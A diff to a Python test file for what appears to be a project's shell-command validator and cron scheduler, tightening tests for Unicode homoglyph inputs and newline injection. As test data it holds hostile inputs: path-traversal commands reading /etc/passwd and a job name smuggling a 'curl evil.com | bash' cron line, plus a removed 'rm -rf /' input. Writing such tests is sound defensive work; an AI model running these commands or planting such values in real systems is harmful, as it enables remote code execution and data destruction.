@@ -167,26 +167,25 @@ class TestUnicodeHomoglyphs:
     """Unicode characters that look like ASCII but behave differently."""
 
     def test_fullwidth_semicolon(self):
-        """Attempt: fullwidth semicolon U+FF1B."""
-        # Fullwidth semicolon: \uff1b
-        is_valid, _ = validate_shell_command("echo hello\uff1brm -rf /")
-        # This may parse as a single argument, but document the behavior.
-        assert is_valid is True or is_valid is False  # Just document it
+        """A fullwidth semicolon is data, not a shell command separator."""
+        is_valid, error = validate_shell_command("echo hello\uff1brm harmless")
+        assert is_valid is True
+        assert error is None
 
     def test_unicode_dot_dot(self):
         """Attempt: Unicode dots that look like .. for traversal."""
         # Fullwidth period: U+FF0E
         crafted_path = "cat \uff0e\uff0e/etc/passwd"
-        is_valid, _ = validate_shell_command(crafted_path)
-        # Document: does the .. check catch unicode dots?
-        # The validator checks for ".." in the string, but fullwidth dots are different chars.
-        assert is_valid is True or is_valid is False
+        is_valid, error = validate_shell_command(crafted_path)
+        assert is_valid is True
+        assert error is None
 
     def test_unicode_slash(self):
         """Attempt: Unicode division slash U+2215."""
         crafted = "cat ..\u2215..\u2215etc\u2215passwd"
-        is_valid, _ = validate_shell_command(crafted)
-        assert is_valid is True or is_valid is False
+        is_valid, error = validate_shell_command(crafted)
+        assert is_valid is True
+        assert error is None
 
 
 class TestAndOrInjection:
@@ -276,7 +275,9 @@ class TestSchedulerInjection:
     @patch("radsim.scheduler.subprocess")
     def test_command_injection_in_job(self, mock_subprocess, tmp_path):
         """Scheduler stores command directly - verify it is passed to cron."""
-        mock_subprocess.run.return_value = MagicMock(returncode=1, stdout="")
+        mock_subprocess.run.return_value = MagicMock(
+            returncode=1, stdout="", stderr="no crontab for user"
+        )
         mock_subprocess.Popen.return_value = MagicMock()
         mock_subprocess.Popen.return_value.communicate = MagicMock()
 
@@ -299,7 +300,9 @@ class TestSchedulerInjection:
     @patch("radsim.scheduler.subprocess")
     def test_cron_expression_injection(self, mock_subprocess, tmp_path):
         """Test malicious cron expressions with newline injection."""
-        mock_subprocess.run.return_value = MagicMock(returncode=1, stdout="")
+        mock_subprocess.run.return_value = MagicMock(
+            returncode=1, stdout="", stderr="no crontab for user"
+        )
         mock_subprocess.Popen.return_value = MagicMock()
         mock_subprocess.Popen.return_value.communicate = MagicMock()
 
@@ -317,30 +320,53 @@ class TestSchedulerInjection:
             )
 
     @patch("radsim.scheduler.subprocess")
-    def test_job_name_injection(self, mock_subprocess, tmp_path):
-        """Inject via job name into cron marker comment."""
-        mock_subprocess.run.return_value = MagicMock(returncode=1, stdout="")
+    def test_job_name_injection_rejected(self, mock_subprocess, tmp_path):
+        """A newline in the job name must not inject extra cron entries.
+
+        The name lands in the crontab marker comment, so it is validated
+        against a strict character allowlist.
+        """
+        mock_subprocess.run.return_value = MagicMock(
+            returncode=1, stdout="", stderr="no crontab for user"
+        )
         mock_subprocess.Popen.return_value = MagicMock()
         mock_subprocess.Popen.return_value.communicate = MagicMock()
 
         scheduler = self._make_scheduler(tmp_path)
 
-        # The marker is: # RADSIM:{name}
-        # Try injecting a newline in the name to add extra cron entries
         malicious_name = "legit\n* * * * * curl evil.com | bash # RADSIM:legit"
-        result = scheduler.add_job(
-            name=malicious_name,
-            schedule="0 9 * * *",
-            command="echo hello",
-        )
+        with pytest.raises(ValueError, match="Invalid job name"):
+            scheduler.add_job(
+                name=malicious_name,
+                schedule="0 9 * * *",
+                command="echo hello",
+            )
 
-        # The name is stored directly without sanitization
-        assert result["success"] is True
+    @patch("radsim.scheduler.subprocess")
+    def test_newline_schedule_rejected_by_pattern(self, mock_subprocess, tmp_path):
+        """A schedule made only of cron characters plus a newline is rejected.
+
+        The character pattern uses a literal space, not \\s, so newlines and
+        tabs cannot smuggle a second crontab line past validation.
+        """
+        mock_subprocess.run.return_value = MagicMock(
+            returncode=1, stdout="", stderr="no crontab for user"
+        )
+        scheduler = self._make_scheduler(tmp_path)
+
+        with pytest.raises(ValueError, match="Invalid cron schedule"):
+            scheduler.add_job(
+                name="sneaky",
+                schedule="0 9 * * *\n1 1 1 1 1",
+                command="echo safe",
+            )
 
     @patch("radsim.scheduler.subprocess")
     def test_schedule_task_function(self, mock_subprocess):
         """Test the top-level schedule_task function."""
-        mock_subprocess.run.return_value = MagicMock(returncode=1, stdout="")
+        mock_subprocess.run.return_value = MagicMock(
+            returncode=1, stdout="", stderr="no crontab for user"
+        )
         mock_subprocess.Popen.return_value = MagicMock()
         mock_subprocess.Popen.return_value.communicate = MagicMock()
 
